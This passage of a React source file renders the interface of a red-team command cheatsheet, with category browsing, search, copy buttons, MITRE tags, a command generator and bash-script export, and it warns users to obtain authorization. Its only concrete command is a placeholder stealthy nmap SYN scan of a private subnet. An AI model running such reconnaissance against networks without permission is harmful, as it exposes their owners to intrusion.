                      advancedMode ? 'translate-x-6' : 'translate-x-1'
                    }`}
                  />
                </button>
              </div>
            </div>
            
            <p className="mb-6 text-zinc-400">
              Answer a few simple questions to generate customized commands for your specific assessment scenario.
            </p>
            
            {/* Advanced Features Selection */}
            {advancedMode && !commandGenerationComplete && (
              <div className="mb-6 p-3 bg-zinc-950/70 border border-zinc-800 rounded-lg">
                <h3 className="text-blue-400 text-sm font-medium mb-2">Advanced Options</h3>
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-2">
                  {advancedFeatures.map(feature => (
                    <div 
                      key={feature.id}
                      onClick={() => toggleAdvancedFeature(feature.id)}
                      className={`p-2 rounded border cursor-pointer flex items-start gap-2 ${
                        selectedAdvancedFeatures.includes(feature.id)
                          ? 'bg-blue-900/30 border-blue-700/50'
                          : 'bg-zinc-900 border-zinc-800 hover:bg-zinc-800'
                      }`}
                    >
                      <div className={`mt-0.5 h-4 w-4 rounded flex-shrink-0 flex items-center justify-center ${
                        selectedAdvancedFeatures.includes(feature.id)
                          ? 'bg-blue-500'
                          : 'bg-zinc-700'
                      }`}>
                        {selectedAdvancedFeatures.includes(feature.id) && 
                          <Check className="h-3 w-3 text-white" />
                        }
                      </div>
                      <div>
                        <div className="text-sm font-medium">{feature.name}</div>
                        <div className="text-xs text-zinc-500">{feature.description}</div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
            
            {!commandGenerationComplete ? (
              <div>
                {commandGeneratorQuestions.map((question, index) => {
                  if (index === currentQuestionIndex && shouldShowQuestion(question)) {
                    return (
                      <motion.div 
                        key={question.id}
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        className="mb-6"
                      >
                        <label className="block mb-2 text-lg font-medium">{question.question}</label>
                        
                        {question.type === 'select' && question.options && (
                          <select
                            value={answers[question.id] || ''}
                            onChange={(e) => handleAnswer(question.id, e.target.value)}
                            className="w-full p-3 bg-zinc-800 border border-zinc-700 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                          >
                            <option value="">Select an option</option>
                            {question.options.map(option => (
                              <option key={option} value={option}>{option}</option>
                            ))}
                          </select>
                        )}
                        
                        {question.type === 'text' && (
                          <input
                            type="text"
                            value={answers[question.id] || ''}
                            onChange={(e) => handleAnswer(question.id, e.target.value)}
                            placeholder={question.placeholder || ''}
                            className="w-full p-3 bg-zinc-800 border border-zinc-700 rounded-md focus:outline-none focus:ring-2 focus:ring-blue-500"
                          />
                        )}
                        
                        {question.type === 'checkbox' && (
                          <div className="flex items-center gap-3">
                            <button
                              onClick={() => handleAnswer(question.id, 'true')}
                              className={`px-4 py-2 rounded-md flex items-center gap-2 ${
                                answers[question.id] === 'true' 
                                  ? 'bg-green-600 text-white' 
                                  : 'bg-zinc-800 text-zinc-300'
                              }`}
                            >
                              {answers[question.id] === 'true' && <Check size={16} />}
                              Yes
                            </button>
                            <button
                              onClick={() => handleAnswer(question.id, 'false')}
                              className={`px-4 py-2 rounded-md flex items-center gap-2 ${
                                answers[question.id] === 'false' 
                                  ? 'bg-red-600 text-white' 
                                  : 'bg-zinc-800 text-zinc-300'
                              }`}
                            >
                              {answers[question.id] === 'false' && <Check size={16} />}
                              No
                            </button>
                          </div>
                        )}
                      </motion.div>
                    );
                  }
                  return null;
                })}
                
                <div className="flex justify-between mt-6">
                  <button
                    onClick={() => {
                      if (currentQuestionIndex > 0) {
                        setCurrentQuestionIndex(currentQuestionIndex - 1);
                      }
                    }}
                    className={`px-4 py-2 rounded-md ${
                      currentQuestionIndex === 0 
                        ? 'bg-zinc-800 text-zinc-500 cursor-not-allowed' 
                        : 'bg-zinc-800 hover:bg-zinc-700 text-zinc-300'
                    }`}
                    disabled={currentQuestionIndex === 0}
                  >
                    Back
                  </button>
                  
                  <button
                    onClick={goToNextQuestion}
                    className={`px-4 py-2 rounded-md flex items-center gap-2 ${
                      !answers[commandGeneratorQuestions[currentQuestionIndex].id]
                        ? 'bg-zinc-800 text-zinc-500 cursor-not-allowed'
                        : 'bg-blue-600 hover:bg-blue-700 text-white'
                    }`}
                    disabled={!answers[commandGeneratorQuestions[currentQuestionIndex].id]}
                  >
                    Next
                    <ArrowRight size={16} />
                  </button>
                </div>
              </div>
            ) : (
              <div>
                <div className="flex items-center justify-between mb-4">
                  <h3 className="text-lg font-semibold text-blue-400">Generated Commands</h3>
                  <div className="flex gap-2">
                    <div className="relative group">
                      <button
                        className="px-3 py-1 bg-green-700/30 hover:bg-green-700/50 border border-green-600/30 rounded-md text-sm flex items-center gap-2"
                      >
                        <Download size={14} />
                        Export
                      </button>
                      <div className="absolute right-0 mt-2 w-48 rounded-md shadow-lg bg-zinc-800 ring-1 ring-black ring-opacity-5 hidden group-hover:block z-10">
                        <div className="py-1">
                          <button
                            onClick={() => downloadAsScript()}
                            className="block px-4 py-2 text-sm text-zinc-300 hover:bg-zinc-700 w-full text-left"
                          >
                            Bash Script (.sh)
                          </button>
                          <button
                            onClick={() => downloadAsProfessional('json')}
                            className="block px-4 py-2 text-sm text-zinc-300 hover:bg-zinc-700 w-full text-left"
                          >
                            JSON Format (.json)
                          </button>
                          <button
                            onClick={() => downloadAsProfessional('csv')}
                            className="block px-4 py-2 text-sm text-zinc-300 hover:bg-zinc-700 w-full text-left"
                          >
                            CSV Format (.csv)
                          </button>
                          <button
                            onClick={() => downloadAsProfessional('yaml')}
                            className="block px-4 py-2 text-sm text-zinc-300 hover:bg-zinc-700 w-full text-left"
                          >
                            YAML Format (.yaml)
                          </button>
                          <button
                            onClick={() => downloadAsProfessional('markdown')}
                            className="block px-4 py-2 text-sm text-zinc-300 hover:bg-zinc-700 w-full text-left"
                          >
                            Markdown (.md)
                          </button>
                        </div>
                      </div>
                    </div>
                    
                    {advancedMode && (
                      <button
                        onClick={() => setShowCustomBuilder(!showCustomBuilder)}
                        className="px-3 py-1 bg-purple-700/30 hover:bg-purple-700/50 border border-purple-600/30 rounded-md text-sm flex items-center gap-2"
                      >
                        <Code size={14} />
                        {showCustomBuilder ? 'Hide Builder' : 'Custom Commands'}
                      </button>
                    )}
                    
                    <button
                      onClick={resetCommandGenerator}
                      className="px-3 py-1 bg-zinc-800 hover:bg-zinc-700 rounded-md text-sm"
                    >
                      Start Over
                    </button>
                  </div>
                </div>
                
                {/* Custom Command Builder */}
                {showCustomBuilder && (
                  <div className="mb-6 p-4 bg-zinc-950/70 border border-zinc-800 rounded-lg">
                    <h4 className="text-purple-400 font-medium mb-3 flex items-center gap-2">
                      <Code size={16} />
                      Custom Command Builder
                    </h4>
                    
                    <div className="space-y-3 mb-4">
                      <div>
                        <label className="block text-xs text-zinc-400 mb-1">Command Title</label>
                        <input
                          type="text"
                          value={currentCustomCommand.title}
                          onChange={(e) => setCurrentCustomCommand(prev => ({...prev, title: e.target.value}))}
                          placeholder="e.g., Custom Port Scan"
                          className="w-full p-2 bg-zinc-800 border border-zinc-700 rounded-md text-sm"
                        />
                      </div>
                      
                      <div>
                        <label className="block text-xs text-zinc-400 mb-1">Description</label>
                        <input
                          type="text"
                          value={currentCustomCommand.description}
                          onChange={(e) => setCurrentCustomCommand(prev => ({...prev, description: e.target.value}))}
                          placeholder="e.g., Scan specific ports with custom options"
                          className="w-full p-2 bg-zinc-800 border border-zinc-700 rounded-md text-sm"
                        />
                      </div>
                      
                      <div>
                        <label className="block text-xs text-zinc-400 mb-1">Command</label>
                        <textarea
                          value={currentCustomCommand.command}
                          onChange={(e) => setCurrentCustomCommand(prev => ({...prev, command: e.target.value}))}
                          placeholder="e.g., nmap -sS -p 22,80,443,3389 -T2 192.168.1.0/24"
                          className="w-full p-2 bg-zinc-800 border border-zinc-700 rounded-md text-sm font-mono min-h-[80px]"
                        />
                      </div>
                      
                      <div>
                        <label className="block text-xs text-zinc-400 mb-1">Notes (optional)</label>
                        <input
                          type="text"
                          value={currentCustomCommand.notes || ''}
                          onChange={(e) => setCurrentCustomCommand(prev => ({...prev, notes: e.target.value}))}
                          placeholder="e.g., Use when targeting specific services with stealth"
                          className="w-full p-2 bg-zinc-800 border border-zinc-700 rounded-md text-sm"
                        />
                      </div>
                      
                      <div className="flex justify-end">
                        <button
                          onClick={addCustomCommand}
                          disabled={!currentCustomCommand.title || !currentCustomCommand.command}
                          className={`px-3 py-1 rounded-md text-sm flex items-center gap-2 ${
                            !currentCustomCommand.title || !currentCustomCommand.command
                              ? 'bg-zinc-800 text-zinc-500 cursor-not-allowed'
                              : 'bg-green-700/30 hover:bg-green-700/50 border border-green-600/30 text-green-400'
                          }`}
                        >
                          <Plus size={14} />
                          Add Command
                        </button>
                      </div>
                    </div>
                    
                    {customCommands.length > 0 && (
                      <>
                        <div className="mb-2 border-t border-zinc-800 pt-3">
                          <h5 className="text-sm font-medium text-zinc-300 mb-2">Your Custom Commands:</h5>
                          <div className="space-y-2">
                            {customCommands.map((cmd, index) => (
                              <div key={index} className="flex items-center justify-between p-2 bg-zinc-900 rounded-md text-sm">
                                <div>
                                  <div className="font-medium">{cmd.title}</div>
                                  <div className="text-xs text-zinc-500 font-mono truncate max-w-[300px]">{cmd.command}</div>
                                </div>
                                <button
                                  onClick={() => removeCustomCommand(index)}
                                  className="p-1 hover:bg-zinc-800 rounded text-zinc-500 hover:text-red-400"
                                  title="Remove command"
                                >
                                  <Trash2 size={14} />
                                </button>
                              </div>
                            ))}
                          </div>
                          
                          <button
                            onClick={addCustomCommandsToGenerated}
                            className="mt-3 px-3 py-1 bg-purple-700/30 hover:bg-purple-700/50 border border-purple-600/30 rounded-md text-sm w-full"
                          >
                            Add Custom Commands to Workflow
                          </button>
                        </div>
                      </>
                    )}
                  </div>
                )}
                
                <p className="mb-4 text-zinc-400 text-sm border-l-2 border-yellow-500 pl-3">
                  These commands are generated based on your inputs and should be executed in sequence. Always ensure you have proper authorization before testing.
                </p>
                
                <div className="space-y-4">
                  {generatedCommands.map((cmd, index) => (
                    <div 
                      key={index}
                      className="p-4 bg-zinc-900 border border-zinc-800 rounded-lg"
                    >
                      <div className="flex items-center justify-between mb-2">
                        <div className="flex items-center gap-2">
                          <div className="w-6 h-6 rounded-full bg-blue-600/20 flex items-center justify-center text-blue-400 text-sm font-bold">
                            {index + 1}
                          </div>
                          <h4 className="font-semibold">{cmd.title}</h4>
                        </div>
                        <button
                          onClick={() => copyToClipboard(cmd.command)}
                          className="p-1 rounded hover:bg-zinc-800 text-zinc-400 hover:text-zinc-200"
                          title="Copy command"
                        >
                          <Copy className="h-4 w-4" />
                        </button>
                      </div>
                      
                      <p className="text-sm text-zinc-400 mb-2">{cmd.description}</p>
                      
                      {cmd.mitreId && advancedMode && (
                        <div className="mb-2 flex items-center gap-2">
                          <span className="bg-red-800/30 text-red-400 text-xs px-2 py-0.5 rounded-md border border-red-800/50">
                            MITRE {cmd.mitreId}
                          </span>
                          <span className="text-xs text-zinc-500">{cmd.mitreTechnique}</span>
                        </div>
                      )}
                      
                      <div className="bg-zinc-950 p-3 rounded font-mono text-sm text-zinc-300 overflow-x-auto">
                        {cmd.command}
                      </div>
                      
                      {cmd.notes && (
                        <div className="mt-2 text-xs text-yellow-500/80 flex items-start gap-1">
                          <HelpCircle className="h-3 w-3 mt-0.5 flex-shrink-0" />
                          <span>{cmd.notes}</span>
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              </div>
            )}
          </motion.div>
        )}
        
        {/* Beginner Helper */}
        {showHelperInfo && (
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.5, delay: 0.1 }}
            className="mb-8 p-4 bg-blue-900/20 border border-blue-700/30 rounded-lg"
          >
            <div className="flex items-start gap-4">
              <div className="bg-blue-500/20 p-3 rounded-full">
                <Terminal className="w-6 h-6 text-blue-400" />
              </div>
              <div>
                <h3 className="text-xl font-semibold text-blue-400 mb-2">How to use this cheatsheet</h3>
                <ol className="list-decimal pl-5 text-zinc-300 space-y-2">
                  <li><span className="font-medium text-white">Select a category</span> from the options below to see available techniques</li>
                  <li><span className="font-medium text-white">Choose a specific area</span> to see the relevant commands</li>
                  <li><span className="font-medium text-white">Copy commands</span> by clicking the copy icon next to each command</li>
                  <li><span className="font-medium text-white">Search</span> for specific commands using the search bar</li>
                  <li><span className="font-medium text-white">Use the Command Generator</span> for step-by-step guidance based on your scenario</li>
                </ol>
                <p className="text-zinc-400 mt-3 text-sm">
                  <strong className="text-yellow-400">Note:</strong> All techniques should only be used on systems you own or have permission to test. Always ensure proper authorization.
                </p>
              </div>
            </div>
            
            {activeHelp && (
              <motion.div
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.5 }}
                className="mt-4 p-3 bg-zinc-900/70 border border-zinc-800 rounded-lg"
              >
                <h4 className="text-blue-400 font-medium mb-1">{selectedCategory} Techniques</h4>
                <p className="text-zinc-300 text-sm">
                  {helpTips[activeHelp as keyof typeof helpTips] || 
                   `Select a specific technique area to see available commands.`}
                </p>
              </motion.div>
            )}
          </motion.div>
        )}
        
        {/* Search Bar */}
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5, delay: 0.1 }}
          className="max-w-2xl mx-auto mb-8"
        >
          <div className="relative">
            <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
              <Search className="h-5 w-5 text-zinc-500" />
            </div>
            <input
              type="text"
              placeholder="Search commands, tools, or techniques..."
              className="block w-full bg-zinc-900/70 backdrop-blur-sm border border-zinc-800 rounded-lg py-3 pl-10 pr-3 placeholder-zinc-500 focus:outline-none focus:ring-2 focus:ring-blue-500/50 focus:border-blue-500/50"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>
        </motion.div>

        {/* Categories */}
        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ duration: 0.5, delay: 0.2 }}
          className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 mb-8"
        >
          {cheatsheetData.map((category, index) => (
            <motion.div
              key={category.name}
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              transition={{ duration: 0.3, delay: 0.1 + index * 0.05 }}
              className={`cursor-pointer rounded-lg border backdrop-blur-sm p-4 transition-all duration-300 hover:shadow-lg ${
                selectedCategory === category.name
                  ? 'bg-blue-900/20 border-blue-700/50'
                  : 'bg-zinc-900/70 border-zinc-800/50 hover:bg-zinc-800/50'
              }`}
              onClick={() => handleCategoryClick(category.name)}
            >
              <div className="flex items-center gap-3">
                <div className={`p-2 rounded-lg ${
                  selectedCategory === category.name
                    ? 'bg-blue-900/50 text-blue-400'
                    : 'bg-zinc-800/80 text-zinc-400'
                }`}>
                  {category.icon}
                </div>
                <div>
                  <h3 className="font-semibold text-lg">{category.name}</h3>
                  <p className="text-sm text-zinc-400">{category.description}</p>
                  <div className="flex items-center gap-1 mt-1">
                    <div className="h-1.5 w-1.5 rounded-full bg-green-500"></div>
                    <span className="text-xs text-zinc-500">{category.subcategories.reduce((total, subcat) => total + subcat.commands.length, 0)} commands</span>
                  </div>
                </div>
              </div>
            </motion.div>
          ))}
        </motion.div>

        {/* Main Content Area */}
        <div className="mt-8">
          {searchTerm || selectedCategory ? (
            <div className="flex flex-col lg:flex-row gap-6">
              {/* Display subcategories when a category is selected */}
              {selectedCategory && !searchTerm && (
                <motion.div 
                  initial={{ opacity: 0, x: -20 }}
                  animate={{ opacity: 1, x: 0 }}
                  transition={{ duration: 0.4 }}
                  className="lg:w-1/4"
                >
                  <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
                    {cheatsheetData.find(c => c.name === selectedCategory)?.icon}
                    <span>{selectedCategory}</span>
                  </h2>
                  <div className="space-y-2">
                    {cheatsheetData
                      .find(c => c.name === selectedCategory)
                      ?.subcategories.map((subcat, idx) => (
                        <motion.div
                          key={subcat.name}
                          initial={{ opacity: 0, y: 10 }}
                          animate={{ opacity: 1, y: 0 }}
                          transition={{ duration: 0.3, delay: 0.05 * idx }}
                          className={`p-3 rounded-lg cursor-pointer transition-colors ${
                            selectedSubcategory === subcat.name
                              ? 'bg-blue-900/30 border border-blue-700/50'
                              : 'bg-zinc-900/70 border border-zinc-800/50 hover:bg-zinc-800/50'
                          }`}
                          onClick={() => handleSubcategoryClick(subcat.name)}
                        >
                          <h3 className="font-semibold">{subcat.name}</h3>
                          <p className="text-sm text-zinc-400">{subcat.description}</p>
                          <div className="flex items-center gap-1 mt-1">
                            <div className="h-1.5 w-1.5 rounded-full bg-blue-500"></div>
                            <span className="text-xs text-zinc-500">{subcat.commands.length} commands</span>
                          </div>
                        </motion.div>
                      ))}
                  </div>
                </motion.div>
              )}
              
              {/* Commands list */}
              <motion.div 
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                transition={{ duration: 0.4, delay: 0.2 }}
                className={`${selectedCategory && !searchTerm ? 'lg:w-3/4' : 'w-full'}`}
              >
                {/* When searching, show all matching categories/subcategories */}
                {searchTerm && (
                  filteredCategories.map((category, categoryIndex) => (
                    <motion.div
                      key={category.name}
                      initial={{ opacity: 0, y: 20 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={{ duration: 0.4, delay: 0.1 + categoryIndex * 0.05 }}
                      className="mb-8"
                    >
                      <h2 className="text-xl font-bold mb-4 flex items-center gap-2">
                        {category.icon}
                        <span>{category.name}</span>
                      </h2>
                      
                      {category.subcategories.map((subcategory, subcatIdx) => (
                        <div key={subcategory.name} className="mb-6">
                          <h3 className="text-lg font-semibold mb-3 text-blue-400">{subcategory.name}</h3>
                          <div className="space-y-3">
                            {renderCommands(subcategory.commands, `${category.name}-${subcategory.name}`)}
                          </div>
                        </div>
                      ))}
                    </motion.div>
                  ))
                )}
                
                {/* When a category is selected without search, show that category */}
                {selectedCategory && !searchTerm && (
                  <div>
                    {/* When no subcategory is selected, show brief description of all subcategories */}
                    {!selectedSubcategory && (
                      <div>
                        <h2 className="text-xl font-bold mb-6">Select a technique area</h2>
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                          {cheatsheetData
                            .find(c => c.name === selectedCategory)
                            ?.subcategories.map((subcat, idx) => (
                              <motion.div
                                key={subcat.name}
                                initial={{ opacity: 0, scale: 0.95 }}
                                animate={{ opacity: 1, scale: 1 }}
                                transition={{ duration: 0.3, delay: 0.05 * idx }}
                                className="p-4 rounded-lg bg-zinc-900/70 border border-zinc-800/50 hover:bg-zinc-800/50 cursor-pointer"
                                onClick={() => handleSubcategoryClick(subcat.name)}
                              >
                                <h3 className="font-semibold text-blue-400">{subcat.name}</h3>
                                <p className="text-sm text-zinc-400 mt-1">{subcat.description}</p>
                                <p className="text-xs text-zinc-500 mt-2">
                                  {subcat.commands.length} {subcat.commands.length === 1 ? 'command' : 'commands'} available
                                </p>
                              </motion.div>
                            ))}
                        </div>
                      </div>
                    )}
                    
                    {/* When a subcategory is selected, show all its commands */}
                    {selectedSubcategory && (
                      <div>
                        <div className="flex items-center justify-between mb-6">
                          <h2 className="text-xl font-bold flex items-center gap-2">
                            <span className="text-blue-400">{selectedSubcategory}</span>
                          </h2>
                          <button
                            onClick={() => setSelectedSubcategory(null)}
                            className="text-xs px-3 py-1 rounded-md bg-zinc-800 hover:bg-zinc-700 text-zinc-300 transition-colors"
                          >
                            Back to all techniques
                          </button>
                        </div>
                        
                        {/* Subcategory description card */}
                        <div className="mb-6 p-4 bg-zinc-900/70 border border-zinc-800/50 rounded-lg">
                          <p className="text-zinc-300">
                            {cheatsheetData
                              .find(c => c.name === selectedCategory)
                              ?.subcategories.find(s => s.name === selectedSubcategory)
                              ?.description}
                          </p>
                          <div className="flex mt-3 gap-1 items-center">
                            <div className="h-2 w-2 rounded-full bg-yellow-500"></div>
                            <p className="text-xs text-zinc-400">
                              Click on any command to see more details and copy it to your clipboard
                            </p>
                          </div>
                        </div>
                        
                        <div className="space-y-3">
                          {renderCommands(
                            cheatsheetData
                              .find(c => c.name === selectedCategory)
                              ?.subcategories.find(s => s.name === selectedSubcategory)
                              ?.commands || [],
                            `${selectedCategory}-${selectedSubcategory}`
                          )}
                        </div>
                      </div>
                    )}
                  </div>
                )}
                
                {/* When nothing is selected or found */}
                {!searchTerm && !selectedCategory && (
                  <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ duration: 0.4 }}
                    className="text-center text-zinc-400 my-12"
                  >
                    <p>Select a category or search for commands</p>
                  </motion.div>
                )}
                
                {searchTerm && filteredCategories.length === 0 && (
                  <motion.div
                    initial={{ opacity: 0 }}
                    animate={{ opacity: 1 }}
                    transition={{ duration: 0.4 }}
                    className="text-center text-zinc-400 my-12"
                  >
                    <p>No commands found matching your search</p>
                  </motion.div>
                )}
              </motion.div>
            </div>
          ) : (
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              transition={{ duration: 0.4 }}
              className="text-center text-zinc-400 my-12"
            >
              <p>Select a category or search for commands</p>
            </motion.div>
          )}
        </div>

        {/* Notification for copied command */}
        {copiedCommand && (
          <div className="fixed bottom-4 left-1/2 transform -translate-x-1/2 bg-zinc-800 text-white px-4 py-2 rounded-md shadow-lg z-50 flex items-center gap-2">
            <Copy className="h-4 w-4 text-green-400" />
            <span>Command copied to clipboard</span>
          </div>
        )}

        {/* Footer */}
        <div className="mt-10 pt-6 border-t border-zinc-800/50 text-center text-zinc-500 text-sm">
          <p>For educational purposes only. Always obtain proper authorization before testing.</p>
          <p className="mt-1">
            Inspired by <a href="https://www.ired.team/offensive-security-experiments/offensive-security-cheetsheets" target="_blank" rel="noopener noreferrer" className="text-blue-400 hover:underline">ired.team</a>
          </p>
        </div>
      </div>
    </div>
  );

  // Helper function to render commands
  function renderCommands(commands: Command[], baseId: string) {
    return commands.map((cmd, cmdIndex) => {
      const commandId = `${baseId}-${cmdIndex}`;
      const isExpanded = expandedCommands[commandId];
      
      return (
        <motion.div
          key={commandId}
          initial={{ opacity: 0, y: 10 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.3, delay: 0.1 + cmdIndex * 0.03 }}
          className="bg-zinc-900/70 backdrop-blur-sm border border-zinc-800 rounded-lg overflow-hidden"
        >
          <div 
            className="p-3 cursor-pointer flex justify-between items-start"
            onClick={() => toggleCommandExpanded(commandId)}
          >
            <div className="flex-1">
              <div className="flex items-center gap-2">
                <div className="text-zinc-300 font-mono text-sm bg-zinc-800/70 px-2 py-1 rounded flex-1 overflow-x-auto">
                  {cmd.command}
                </div>
                <button
                  onClick={(e) => {
                    e.stopPropagation();
                    copyToClipboard(cmd.command);
                  }}
                  className="p-1 rounded hover:bg-zinc-800 text-zinc-400 hover:text-zinc-200"
                  title="Copy command"
                >
                  <Copy className="h-4 w-4" />
                </button>
              </div>
              <p className="text-sm text-zinc-400 mt-1">{cmd.description}</p>
              
              {/* Show small indicator if example is available */}
              {cmd.example && !isExpanded && (
                <div className="flex items-center gap-1 mt-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-green-500"></div>
                  <span className="text-xs text-green-500/80">Example available</span>
                </div>
              )}
            </div>
            <div className="ml-2 text-zinc-500">
              {isExpanded ? <ChevronDown className="h-5 w-5" /> : <ChevronRight className="h-5 w-5" />}
            </div>
          </div>
          
          {isExpanded && cmd.example && (
            <div className="px-3 pb-3 pt-1">
              <div className="text-sm">
                <div className="text-green-500 mb-1 flex items-center gap-1">
                  <div className="h-1.5 w-1.5 rounded-full bg-green-500"></div>
                  <span>Example:</span>
                </div>
                <div className="font-mono bg-zinc-950/70 p-2 rounded-md text-zinc-300 overflow-x-auto flex justify-between gap-2">
                  <code>{cmd.example}</code>
                  <button
                    onClick={() => copyToClipboard(cmd.example || '')}
                    className="p-1 rounded hover:bg-zinc-800 text-zinc-400 hover:text-zinc-200 flex-shrink-0"
                    title="Copy example"
                  >
                    <Copy className="h-3 w-3" />
                  </button>
                </div>
              </div>
            </div>
          )}
        </motion.div>
      );
    });
  }
};

export default RedTeamCheatsheetWrapper; 